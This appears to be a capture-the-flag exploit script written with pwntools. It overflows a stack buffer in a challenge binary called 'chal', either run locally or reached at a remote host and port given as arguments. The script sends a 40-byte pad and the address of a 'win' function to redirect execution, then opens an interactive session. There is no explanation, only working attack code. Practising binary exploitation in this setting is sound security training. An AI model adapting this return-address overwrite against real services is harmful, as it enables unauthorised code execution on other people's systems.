from pwn import *
import sys
# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(r,)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
win = 0x4011b6
r.sendlineafter(b'gift:\n',cyclic(40) + p64(win))
r.interactive()